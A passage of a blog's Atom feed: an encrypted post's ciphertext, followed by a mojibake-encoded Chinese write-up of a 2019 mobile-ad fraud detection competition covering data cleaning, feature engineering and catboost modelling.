8292798238ca8a4679eb5792bc22792797d0ade67fef0a10ae2da86d75d88dcdc81df5152eb932bd1de02b79e767b7b3bfebcbd9a36a537d526fb9219eb4ad793de76cabac38bab53ed6170e2b0240e69a7c84d561a5029a4a2534f27dc7dd4ef0614d26385ff2858931888b242a8ff37521c413b320b7a1547384e8908fc35f3108f90df65db385091b0587c0940b3a0a6e40a1e080e888e9566af0ec7476d9e5d1d9c6648b189e057a4c5ce369162acf30aa39833d356561e4139dfcf3bec6759ccce2b7d9bfd1f60f451be25f358610c9ef0713d5f48931a82b3ba08f516400e837ede5e08a968ecd473e772e3b26196912dfea81d19f773a0a71f0a98b61421006b52236256ad851517b1045e6128d97cbe4c1ae72bdc256d8d321caad0de2063134b7fb9d479b00a00b15fb6fbe5d8c02c305473d74a3c19cb482ecdf7966ab327b74c0ecb62d324083164c399f7297374c8cd2aa1b42b581ef88a2bd4f8574e16703d758a6ad54a2db6f77b7e30cca2b2f27fe12a3e685ec7770c9fb6aa021d2e9206ab22bdd4c7fef8da5f4be7bdcfb7baa83992f89f9427f4b0aa1f81016616661fb770300bcb488d503aee5596d89673aaf99f85748badffdd180e61b677d27183003bf5b234eca663d01b1ae7a56dab76f1381c8b42e661fed22e60fdc15f8032df3920f569b35b7f5ec153f73d814defc29a915168f580d5a8820c0249824df23f8dfc6410a7fc44fbc9dc72c1807f76cd93a3e51c3fd360deb4bdb94279b7af97ad20e16032df06b8b9836ef009c9ee911071db7fb75a6c8a93736e374c3deadbb57df37b79cba7113dba781511ad458ec615bcafd0c614d9c86d896b439aebb5bc3b22ccbdf728803b1b03ef5d338e4f4d171452230e0be5df0356eb6196a5449c34f476f4755ea46b786369932b16b0204b59e9edd1c9ac75d2192e65cf534860f3a34976323bfe90da24673acf4b0074f798a29a2c25a0deeb8436483da75fcf15220baec9b402dde4acd40c79b8abb0c6e461828cc01fcf8a295a0d5c7c844c48ff69a16cb9c60b068318d787434868c4e4e51a251978de3d17c7128115ffbf0506bb185ec0b8a2e21c74f39b396f1b0ae84cdddd164e9b99a03ad85cbfdc64121929a4e8cbec8dab86e17e4f919798db0a2cea55187ffc3455872d2d326776d56139e18f7757a85c05f8f744547aee6caf55952c41cc43f3a9ce5c9bb326c58299451bc1242644825856efc65b162a4518f4171fed2c5f94b20098ba37902ba7c0b835c1cf46b3628ebaba9dbb768ed80db8db6db60b3adb91a9260db9cd6e661aa57a38185a23b03046586dbecd0e3a3150c309973622a3dd00c67e4cab7b4db5103f0d2c6c9533b2883b7402203b501522b4b874bd8e68554fa119a3ef4a4447de5f757ffaf02d842303b310a5ec9024fe8246aa59ecb2839688f377bb61b44037659e6e0589543460278a539a8cd117451e272b14d12ac733c7d0f54384ae1684454e894d94421c2507cd7c2b795351164169e50352ae6acc176c4b8b65980fd4d01fa861dae44cf98d6ce384199b7b75987638449eb282f5952e78adb74b94f2d74d0db91dee8b6418cafb3e1f9e3a02259922fce3a9032517b483b2903cd203114d65f7680929919a879ba7f836320186cbaef7120e005fd5c3cee64739522c349f08f7c0e3e4d921fd420d32834e46637e40397bafc2ac33f05ac92c49af1fedd365492873a00210e1279a0e01872190d8a6d991d35c1342cb5d38bc6abf9f1770d95385c0537120ce4772498a0e169a2c314f76666c10b0d76d3b202d91207d746496d96fc4ddeb9a513d377857ca13eac11b342cd163b481b0eabd2c60460ddafb078cef163810f37a71eaf9e84ec5a550b67042aa2d67a2d771945e8335fd7bee34e569d6f8eb245bb230f2e5ad59eb911c819c2a87290850edfdd9a991477662e16a165f38cdc5e507011fb9b5944ed8d549d259ec607f316f3d0cecfab680e14b74cef8b544e7eaf579e59035254209e78fa46702e4b0f64c582da2d0cb6c48296b62e079423995955976bef658d27cc4b5b1cb5d6d7b1efc2a979d8a5c8cb39fa156386e4f7552c5bb57e127aa74b2b73e7131da85a158943383e27b70f08dbe3e78de229540789aad9a2f6d038120c1df2e26c174d94ed7b445a1d31c4e805233416e435c87fa2e848e1f75029d6b55d94b39823bcc972fa1baf46fd5a9603dd573532b3bfab695c3b52c241b7fecfef2db0f241783ba0b244e3ae688c4e12081792a3bb3fba48bc6cfd9abb729e3c875deaf9cf37469c1d36ce9ad0d708b10d50e3aaf7109ed0649279ab80eda59d3ac98152a7f4e0733ac01766f8a62bed1f41a3c331082ac821e5ef26bfba5a95537f234548881584ab62ef20afb5bb2457993b465e0984ce833d843d5944dd4187f41b7f77c95b388c7f6ab16cad88f525181d924a5018c672131669ef2fce496788afb83df31a6cb0d70a74a150d488f86aff1cd0094987e8006cb8dd96d38d9d2689d68ab04ca32eaaad1d05d9b3ac2ff653e766bcfadf0bd4bdcb6fdf94c88996166549ed5d8c582e5415f8ccc028afd9a8b1b85c288a50106268376a90d93a44abd8e659428cc48606f746cc07bac0772adffa81353e70ba8acf5ea4aa4cf347a9095732ca66866f23636a47a3e57ed5f99586a8a1a71c780ee4639d42635f415a5b7920482cdee7105367bf5574555256c90524b11179fb9f3b86872db69831effd8ce9bd13665925259d35d9b16df2fe10ba8dfd26ff22c80af525bae7d4967cc5fc628711cba080327c38db7363d747f2a88347e6b901e784ba0e687aeeb0c7e554432be364d92fd2baeadd05e5dd377b5d566d96b1fb2f8777dae590a29cbb1bf53f0cac093c4459b41c395626945719136870e879ad0d14a9d9a09ca3a286e981cb9e1a2e963f75e1efd535cc23e66689c47359a651d150f2cfe0428f675cd4abd05101514d593f8554175ef5e6c2c24fe5ea2bd7cbaa17e38006181162adeeda435592daeee9e78c10718e274debeed9c5a9ceda774fe16d0ba4becbb560016242c630511a6ca31f9746e7e73811c319093e2c08bdc41cc1185fc18a2c62ceadb99758ddee5b294dde0830db08ba7fe649a84d94d23e4169299f793b795f98863681aa9d1ab67664e6428cd8dd71ec2d50a16555bfd74cfbad82033031a062b949eb41c4bdcd45ff6b132474fa23a0d7f971953c4e40535d4f1983e79def1ab6bda2ebf432f39c90b204412b28cc06ddf2708852269f3728d2a2451c2fc6d3c152d</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
        <author>
            <name><![CDATA[LogicJakeâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[2019ç§‘å¤§è®¯é£ç§»åŠ¨å¹¿å‘Šåæ¬ºè¯ˆç®—æ³•æŒ‘æˆ˜èµ›ç®—æ³•-èµ›åæ€»ç»“]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<p>æœ€ç»ˆæˆç»©ï¼šå¤èµ›ç¬¬äºŒï¼Œå†³èµ›äºšå†›ã€‚<br>æ¯”èµ›åœ°å€ï¼š<a href="http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD" target="_blank" rel="noopener">http://challenge.xfyun.cn/2019/gamedetail?type=detail/mobileAD</a></p><h1 id="èµ›é¢˜èƒŒæ™¯"><a href="#èµ›é¢˜èƒŒæ™¯" class="headerlink" title="èµ›é¢˜èƒŒæ™¯"></a>èµ›é¢˜èƒŒæ™¯</h1><p>è®¯é£AIè¥é”€äº‘åŸºäºæ·±è€•å¤šå¹´çš„äººå·¥æ™ºèƒ½å’Œå¤§æ•°æ®æŠ€æœ¯ï¼Œèµ‹äºˆè¥é”€æ™ºæ…§åˆ›æ–°çš„å¤§è„‘ï¼Œä»¥å¥å…¨çš„äº§å“çŸ©é˜µå’Œå…¨æ–¹ä½çš„æœåŠ¡ï¼Œå¸®åŠ©å¹¿å‘Šä¸»ç”¨AI+å¤§æ•°æ®å®ç°è¥é”€æ•ˆèƒ½çš„å…¨é¢æå‡ï¼Œæ‰“é€ æ•°å­—è¥é”€æ–°ç”Ÿæ€ã€‚</p><p>å¹¿å‘Šæ¬ºè¯ˆæ˜¯æ•°å­—è¥é”€é¢ä¸´çš„ä¸€ä¸ªé‡å¤§æŒ‘æˆ˜ï¼Œéšç€åŸºç¡€æŠ€æœ¯çš„æˆç†ŸåŒ–ï¼ˆç¯¡æ”¹è®¾å¤‡ä¿¡æ¯ã€IPv4æœåŠ¡åŒ–ã€é»‘å¡ã€æ¥ç å¹³å°ç­‰ï¼‰ï¼Œå¹¿å‘Šæ¬ºè¯ˆå‘ˆç°å‡ºè§„æ¨¡åŒ–ã€é›†å›¢åŒ–çš„è¶‹åŠ¿ï¼Œå…¶ä½œå¼Šæ‰‹æ®µä¸»è¦åŒ…æ‹¬æœºå™¨äººã€æ¨¡æ‹Ÿå™¨ã€ç¾¤æ§ã€è‚‰é¸¡/åé—¨ã€ä¼—åŒ…ç­‰ã€‚å¹¿å‘Šæ¬ºè¯ˆä¸æ–­èš•é£Ÿç€è¥é”€ç”Ÿæ€ï¼Œåæ¬ºè¯ˆæˆä¸ºæ•°å­—è¥é”€é¢†åŸŸäºŸå¾…çªç ´çš„å…³é”®é—®é¢˜ã€‚</p><a id="more"></a><h1 id="æ•°æ®è¯´æ˜"><a href="#æ•°æ®è¯´æ˜" class="headerlink" title="æ•°æ®è¯´æ˜"></a>æ•°æ®è¯´æ˜</h1><p>æœ¬æ¬¡æ¯”èµ›ä¸ºå‚èµ›é€‰æ‰‹æä¾›äº†5ç±»æ•°æ®ï¼šåŸºæœ¬æ•°æ®ã€åª’ä½“ä¿¡æ¯ã€æ—¶é—´ã€IPä¿¡æ¯å’Œè®¾å¤‡ä¿¡æ¯ã€‚åŸºæœ¬æ•°æ®æä¾›äº†å¹¿å‘Šè¯·æ±‚ä¼šè¯sidï¼Œä»¥åŠâ€œæ˜¯å¦ä½œå¼Šâ€çš„æ ‡è¯†ã€‚åª’ä½“ä¿¡æ¯ã€æ—¶é—´ã€IPä¿¡æ¯å’Œè®¾å¤‡ä¿¡æ¯ç­‰4ç±»æ•°æ®ï¼Œæä¾›äº†å¯¹ä½œå¼Šé¢„ä¼°å¯èƒ½æœ‰å¸®åŠ©çš„è¾…åŠ©ä¿¡æ¯ã€‚</p><p>å‡ºäºæ•°æ®å®‰å…¨ä¿è¯çš„è€ƒè™‘ï¼Œæ‰€æœ‰æ•°æ®å‡ä¸ºè„±æ•å¤„ç†åçš„æ•°æ®ã€‚æ•°æ®é›†æä¾›äº†è‹¥å¹²å¤©çš„æ ·æœ¬ï¼Œæœ€åä¸€å¤©æ•°æ®ç”¨äºé¢„æµ‹ï¼Œä¸æä¾›â€œæ˜¯å¦ä½œå¼Šâ€æ ‡è¯†ï¼Œå…¶ä½™æ—¥æœŸçš„æ•°æ®ä½œä¸ºè®­ç»ƒæ•°æ®ã€‚</p><h1 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h1><h2 id="æ•°æ®é¢„å¤„ç†"><a href="#æ•°æ®é¢„å¤„ç†" class="headerlink" title="æ•°æ®é¢„å¤„ç†"></a>æ•°æ®é¢„å¤„ç†</h2><p>è¿™ä¸€é¢˜æ•°æ®é¢„å¤„ç†å äº†å¾ˆå¤šç¯‡å¹…ï¼Œä¸»è¦åŒ…æ‹¬ä¸¤éƒ¨åˆ†ï¼šå¯¹æ— æ„ä¹‰å­—ç¬¦æˆ–ä¹±ç çš„å¤„ç†ï¼›åŸºäºä¸šåŠ¡éœ€è¦çš„æ•°æ®å¤„ç†ã€‚åœ¨æˆ‘ä»¬çš„æ–¹æ¡ˆä¸­ï¼Œç€é‡å¯¹æ“ä½œç³»ç»Ÿï¼ˆosvï¼‰ï¼Œæ‰‹æœºåˆ¶é€ å‚å•†ï¼ˆmakeï¼‰å’Œæœºå‹ï¼ˆmodelï¼‰è¿›è¡Œå¤„ç†ã€‚æœ‰äº› osv åŒ…å«æ— æ„ä¹‰çš„å­—æ®µï¼Œæ¯”å¦‚â€œ??????????????????????????Ø‰*o\x18â€æˆ–â€œ..Ã¾\x06&lt;Ã¾\x1f&lt;Ã¾f&lt;Ã¾`&lt;Ã¾]&gt;Ã¾Ü¾Ã¾\x08?Ã¾2?Ã¾z?Ã¾|?Ã¾\u07ffÃ¾?Ã¾â€ï¼Œæˆ‘ä»¬ç›´æ¥å°†å…¶å…¨éƒ¨æ›¿æ¢æˆ-1ã€‚osv ä¸»è¦ç”±â€œ.â€åˆ†éš”çš„æ•°å­—ç»„æˆï¼Œå¦‚7.1.9çš„å½¢å¼ï¼Œä½†åœ¨å®é™…æ•°æ®ä¸­åŒ…å«ä¸€äº›ç”±å…¶ä»–å­—ç¬¦ç”šè‡³å­—æ¯åˆ†éš”çš„osvï¼Œå°†è¿™äº›åˆ†éš”ç¬¦æ›¿æ¢æˆâ€œ.â€ï¼Œä¿è¯ç»Ÿä¸€æ€§ã€‚</p><p>make æœ€ä¸»è¦çš„é—®é¢˜æ˜¯åŒä¸€å‚å•†ä¸‹çš„ä¸­è‹±æ–‡åç§°å…±å­˜ï¼Œæ¯”å¦‚â€œåä¸ºâ€å’Œâ€œhuaweiâ€æ²¡æœ‰å¿…è¦è®¤ä¸ºå…¶æ˜¯ä¸¤ä¸ªä¸åŒçš„å‚å•†ï¼ˆæ»‘ç¨½ï¼‰ï¼Œæ‰€ä»¥ç»Ÿä¸€å°†ä¸­æ–‡åç§°è½¬æˆå°å†™è‹±æ–‡åç§°ã€‚æ­¤å¤–å¯¹äºä¸€äº›è¿‡äºç²¾ç»†åŒ–çš„åˆ†ç±»è¿›è¡Œç²—æ”¾ï¼Œæ¯”å¦‚â€œè£è€€â€å½’åˆ°â€œhuaweiâ€ï¼Œâ€œm1â€ï¼Œâ€œm2â€ï¼Œâ€œm3â€å…¨éƒ½å½’åˆ°â€œxiaomiâ€ã€‚</p><p>model å¤§éƒ¨åˆ†æ•°æ®æ ¼å¼éƒ½æ˜¯â€œå‚å•† å…·ä½“æœºå‹â€ï¼Œä½†å¾ˆå¤šæ•°æ®éƒ½æ˜¯é‡‡ç”¨å‚å•†è‡ªå·±ç‹¬æœ‰çš„ç¼–å·ï¼Œæ¯”å¦‚ OPPO å°±æœ‰â€œPACM00â€ï¼Œâ€œPBAM00â€â€¦å› ä¸º OPPO è¿™ç±»æ•°æ®è¾ƒå¤šï¼Œæ‰€ä»¥ç‰¹æ„å¯¹å…¶è¿›è¡Œæ ‡å‡†æ ¼å¼è½¬æ¢ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACM00'</span>,<span class="string">"OPPO R15"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBAM00'</span>,<span class="string">"OPPO A5"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBEM00'</span>,<span class="string">"OPPO R17"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PADM00'</span>,<span class="string">"OPPO A3"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBBM00'</span>,<span class="string">"OPPO A7"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PAAM00'</span>,<span class="string">"OPPO R15_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PACT00'</span>,<span class="string">"OPPO R15_2"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PABT00'</span>,<span class="string">"OPPO A5_1"</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">data[<span class="string">'model'</span>].replace(<span class="string">'PBCM10'</span>,<span class="string">"OPPO R15x"</span>, inplace=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šä¸‰åˆ—æ•°æ®è¿˜å­˜åœ¨ä¸€ä¸ªå…±æœ‰é—®é¢˜ï¼šå­˜åœ¨ä¸€äº› url ç¼–ç å­—ç¬¦ï¼Œå°†å…¶è½¬æ¢æˆå¯¹åº”çš„å­—ç¬¦ã€‚å¦å¤–å¯¹äºâ€™hâ€™, â€˜wâ€™, â€˜ppiâ€™è¿™äº›æ•°å€¼å±æ€§çš„ç¼ºå¤±å€¼ï¼Œé‡‡ç”¨åŒä¸€è®¾å¤‡ç”Ÿäº§å‚å•†ä¸‹è¯¥å±æ€§çš„å¹³å‡å€¼å¡«å……ã€‚</p><h2 id="ç‰¹å¾å·¥ç¨‹"><a href="#ç‰¹å¾å·¥ç¨‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹"></a>ç‰¹å¾å·¥ç¨‹</h2><p>è¿™ä¸€é¢˜æœ‰ä¸ªæ˜æ˜¾çš„ç‰¹ç‚¹å°±æ˜¯ç±»åˆ«ç‰¹å¾ç‰¹åˆ«å¤šï¼Œä¼—æ‰€å‘¨çŸ¥ catboost æ“…é•¿å¤„ç†ç±»åˆ«ç‰¹å¾ï¼Œæ‰€ä»¥ç›´æ¥å°†åŸå§‹ç‰¹å¾å–‚åˆ° catboostï¼Œç›¸å¯¹äºå…¶ä»–æ¨¡å‹æ•ˆæœéå¸¸å¥½ã€‚åœ¨æˆ‘çš„ç†è§£ä¸­ï¼Œåˆ¤æ–­æ¬ºè¯ˆè¡Œä¸ºï¼Œå…¶å®å°±æ˜¯é€šè¿‡å¤šå› ç´ çš„ç´¯åŠ æ¥é€æ­¥ç¡®è®¤æ¬ºè¯ˆçš„å¯èƒ½æ€§ï¼Œæ¯”å¦‚è¯´æ¥è‡ªæŸä¸ªåŸå¸‚çš„ç‚¹å‡»æ¬ºè¯ˆè¡Œä¸ºå¯èƒ½æ€§ä¸º20%ï¼Œå‡å¦‚å…¶åŒæ—¶åˆæ˜¯ä½¿ç”¨çš„æŸä¸ªæ¬ºè¯ˆè¡Œä¸ºé¢‘ç¹çš„æœºå‹ï¼Œåˆ™æ¬ºè¯ˆå¯èƒ½æ€§å°±åˆä¼šæé«˜ã€‚æ‰€ä»¥åœ¨è¿™é¢˜ä¸­ï¼Œå¯¹ç±»åˆ«ç‰¹å¾è¿›è¡Œå¤§é‡çš„äº¤å‰ç»„åˆæ˜¯æœ‰æ•ˆçš„ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆ catboost çš„æ•ˆæœè¦å¥½ï¼Œcatboost ä¼šè‡ªåŠ¨è¿›è¡Œç±»åˆ«ç‰¹å¾çš„ç»„åˆã€‚åœ¨æ¯”èµ›äº¤æµç¾¤ï¼Œæœ‰äººé—®æ—¢ç„¶ catboost å·²ç»èƒ½å¤Ÿå®Œæˆç‰¹å¾ç»„åˆï¼Œé‚£ä¹ˆç‰¹å¾å·¥ç¨‹è¿˜æœ‰å¿…è¦åšå¤§é‡çš„ç»„åˆç‰¹å¾å—ï¼Ÿæˆ‘è®¤ä¸ºæ˜¯å¿…è¦çš„ï¼Œè¿™ä¸ªé“ç†å…¶å®å’Œâ€œæ·±åº¦æ¨¡å‹ç†è®ºä¸Šèƒ½å¤Ÿå®Œæˆç‰¹å¾çš„é«˜é˜¶ç»„åˆï¼Œä½†åœ¨æ¯”èµ›ä¸­äººå·¥ç‰¹å¾å·¥ç¨‹è¿˜æ˜¯å­˜åœ¨çš„â€ä¸€æ ·ï¼Œéƒ½æ˜¯ä¸ºäº†åœ¨æºå¤´ä¸Šé™ä½æ‹Ÿåˆçš„éš¾åº¦ï¼Œæå‡æ€§èƒ½çš„ä¸Šé™ã€‚</p><p>æˆ‘ä»¬è¿˜å¯ä»¥æ ¹æ® count å’Œ nunique æ¥æŒ–æ˜æ¬ºè¯ˆè¡Œä¸ºï¼Œæ¯”å¦‚ imei æ˜¯æ‰‹æœºä¸²å·ï¼Œä¸€éƒ¨æ‰‹æœºå¯¹åº”ä¸€ä¸ªå”¯ä¸€çš„ imeiã€‚æ¬ºè¯ˆå›¢ä¼™ä¸ºäº†èº²é¿åˆ¶è£å¾€å¾€ä¼šåˆ·æœºï¼Œä»è€Œæ”¹å˜ model å€¼ï¼Œæ¯”å¦‚å°†åŸæœ¬çš„åä¸ºæ‰‹æœºåˆ·æˆå°ç±³ã€‚é’ˆå¯¹ä»¥ä¸Šè¡Œä¸ºï¼Œæˆ‘ä»¬å¯ä»¥ç»Ÿè®¡ imei æœ‰å¤šå°‘ä¸ªä¸åŒçš„ model ï¼Œé€šè¿‡è¿™ä¸ªç‰¹å¾åˆ¤æ–­è¿™æ˜¯ä¸€ä¸ªå­˜åœ¨åˆ·æœºè¡Œä¸ºçš„è®¾å¤‡ã€‚ç±»ä¼¼çš„ï¼Œé’ˆå¯¹è®¾å¤‡æŒ‚ä»£ç†å¯ä»¥ç»Ÿè®¡ imei æœ‰å¤šå°‘ä¸ªä¸åŒçš„ cityã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥æ„é€ å…¶ä»–ç‰¹å¾æ¥å¯»æ‰¾æ¬ºè¯ˆè¡Œä¸ºï¼Œæ¯”å¦‚æ¬ºè¯ˆå›¢ä¼™ä¼šåŒæ—¶æ§åˆ¶å¤§é‡çš„æ‰‹æœºè¿›è¡Œå¹¿å‘Šç‚¹å‡»ï¼Œå› æ­¤ä¼šå¤§é‡é‡‡è´­æŸäº›ä»·å»‰çš„æœºå‹ï¼Œå¯¹åº”çš„è¿™äº›æœºå‹ä¼šç‚¹å‡»å¤§é‡ä¸”ä¸åŒçš„å¹¿å‘Šã€‚è¿™éƒ½æ˜¯å¯ä»¥é€šè¿‡ count å’Œ nunique ç‰¹å¾å’Œæ­£å¸¸ç‚¹å‡»è¡Œä¸ºåˆ†å¼€çš„ï¼Œå› ä¸ºæ­£å¸¸çš„ç”¨æˆ·ä¸ä¼šå»ç‚¹å‡»é‚£ä¹ˆå¤šå¹¿å‘Šã€‚</p><p>é™¤äº† count å’Œ nunique ç»Ÿè®¡ç‰¹å¾ï¼Œè¿˜å¯ä»¥æ¨¡ä»¿ç‚¹å‡»ç‡æ„é€ æ¬ºè¯ˆç‡ç‰¹å¾ï¼Œæ¯”å¦‚æŸä¸ª model æˆ–è€… cityï¼Œæ¬ºè¯ˆæ¬¡æ•°å æ€»æ¬¡æ•°çš„æ¯”ç‡ã€‚æ„é€ æ¬ºè¯ˆç‡ç‰¹å¾çš„å‡ºå‘ç‚¹æ¥è‡ªèµ›é¢˜èƒŒæ™¯ä¸­æ‰€è¯´çš„â€œå¹¿å‘Šæ¬ºè¯ˆå‘ˆç°å‡ºè§„æ¨¡åŒ–ã€é›†å›¢åŒ–çš„è¶‹åŠ¿â€ï¼Œè§„æ¨¡åŒ–ï¼Œé›†å›¢åŒ–çš„æ˜¾è‘—ç‰¹ç‚¹å°±æ˜¯æ¬ºè¯ˆè¡Œä¸ºé›†ä¸­åœ¨æŸä¸ªåŸå¸‚ï¼Œå¤§é‡ä½¿ç”¨æŸä¸ªæœºå‹è¿›è¡Œæ¬ºè¯ˆã€‚æ­¤å¤–ï¼Œèµ›é¢˜ä¸­çš„ ip ä¿¡æ¯ä¹Ÿå¯ä»¥ç”¨æ¥å‘ç°è§„æ¨¡åŒ–ï¼Œé›†å›¢åŒ–è¡Œä¸ºï¼Œip èƒ½ç»™å‡ºå¾ˆå¤šæœ‰ç”¨ä¿¡æ¯ï¼Œæ¯”å¦‚ ip èƒ½ååº”è¿è¥å•†ï¼Œè®¾å¤‡æ‰€åœ¨ç½‘æ®µï¼Œä»è€Œååº”è¿™éƒ¨åˆ†è®¾å¤‡æ˜¯å¦å¤„åœ¨ä¸€ä¸ªå¤§é‡ä¸”é›†ä¸­çš„ç¯å¢ƒä¸‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ‰€ä»¥å¯ä»¥å¯¹ ip æŒ‰â€™.â€˜è¿›è¡Œåˆ†æ®µï¼Œå–å‰ä¸€ä¸ªï¼Œå‰ä¸¤ä¸ªï¼Œå‰ä¸‰ä¸ªä½œä¸ºæ–°çš„ç½‘æ®µç±»åˆ«ç‰¹å¾ï¼Œç›¸è¾ƒäº city è¿›ä¸€æ­¥ç»†åŒ–äº†é›†å›¢åŒ–ï¼Œè§„æ¨¡åŒ–æ¦‚å¿µã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/%E6%89%8B%E6%9C%BA%E9%9B%86%E7%BE%A4.jpg" alt="æ‰‹æœºé›†ç¾¤ï¼ˆå›¾ç‰‡æ¥è‡ªç½‘ç»œï¼‰" title="">                </div>                <div class="image-caption">æ‰‹æœºé›†ç¾¤ï¼ˆå›¾ç‰‡æ¥è‡ªç½‘ç»œï¼‰</div>            </figure></div><h2 id="æ¨¡å‹"><a href="#æ¨¡å‹" class="headerlink" title="æ¨¡å‹"></a>æ¨¡å‹</h2><p>è¿™é¢˜æ¯«æ— ç–‘é—®é‡‡ç”¨ catboost æ¯”è¾ƒå¥½ï¼Œä½†å·¨å¤§çš„æ•°æ®é‡åŠ ä¸Šå¤§é‡çš„ç±»åˆ«ç‰¹å¾å¯¼è‡´ååˆ†åƒå†…å­˜ï¼Œæ¨¡å‹è®­ç»ƒå®Œæˆå›é€€åˆ°æœ€ä¼˜è¿­ä»£è½®æ¬¡çš„æ—¶å€™ç»å¸¸å†…å­˜æº¢å‡ºã€‚åˆèµ›çš„æ—¶å€™é‡‡ç”¨ lgb å’Œ catboost è¿›è¡ŒæŠ•ç¥¨ï¼Œåˆ°å¤èµ›ç›´æ¥å°± catboost ä½†æ¨¡å‹äº†ã€‚æœ€åå¤èµ› A æ¦œ98.26379ï¼ŒB æ¦œ98.24133ï¼Œè¿˜æ˜¯å¾ˆç¨³å®šçš„ã€‚ </p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è§‚çœ‹ç°åœºå‰ä¸‰çš„ç­”è¾©ï¼Œæ€»ä½“æ€è·¯ä¸Šå¤§å®¶éƒ½å·®ä¸å¤šã€‚ç¬¬ä¸‰åé˜Ÿä¼å°å…”å­ä¹–ä¹–é‡‡ç”¨äº†â€œä¼ªæ ‡ç­¾â€ï¼Œå°†æµ‹è¯•é›†å½“ä¸­é¢„æµ‹æ¦‚ç‡å€¼å¤§äº0.999çš„ä½œä¸ºæ­£æ ·æœ¬ï¼Œå°äº0.001çš„ä½œä¸ºè´Ÿæ ·æœ¬åŠ å…¥åˆ°è®­ç»ƒé›†é‡æ–°è®­ç»ƒï¼Œæé«˜äº†è®­ç»ƒé›†çš„æ•°æ®é‡ï¼Œè¿™ä¸€åšæ³•ä½¿å¾—æ¨¡å‹æ•ˆæœæé«˜äº†0.0035å·¦å³ã€‚ç¬¬ä¸€åç›´æ¥æ˜¯ä¸€ä¸ªå…¬å¸ç»„çš„é˜Ÿä¼ï¼Œå…¶ä¸»è¦äº®ç‚¹å°±åœ¨äºé€šè¿‡éƒ¨åˆ†æœ‰è§„åˆ™ç¢°æ’çš„æ–¹å¼è¿˜åŸ MD5 åŠ å¯†äº†çš„ imeiï¼Œç„¶åå¯¹è¿˜åŸåçš„ imei è¿›è¡Œæˆªæ–­ï¼Œå…·ä½“æµç¨‹è§ä¸‹å›¾ã€‚</p><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E1.png" alt="imei é€†å‘1" title="">                </div>                <div class="image-caption">imei é€†å‘1</div>            </figure></div><div style="margin: auto"><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="http://pic.logicjake.xyz/imei%E7%A2%B0%E6%92%9E2.png" alt="imei é€†å‘2" title="">                </div>                <div class="image-caption">imei é€†å‘2</div>            </figure></div><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><ul><li><a href="https://www.zhihu.com/question/364517083" target="_blank" rel="noopener">DNNå¯ä»¥è¿›è¡Œé«˜é˜¶ç‰¹å¾äº¤äº’ï¼Œä¸ºä»€ä¹ˆWide&amp;Deepå’ŒDeepFMç­‰æ¨¡å‹ä»ç„¶éœ€è¦æ˜¾å¼æ„é€ Wideéƒ¨åˆ†ï¼Ÿ</a></li><li><a href="https://1024.iflytek.com/h5/" target="_blank" rel="noopener">ç°åœºå†³èµ›å½•æ’­</a></li></ul>]]></content>
        <author>
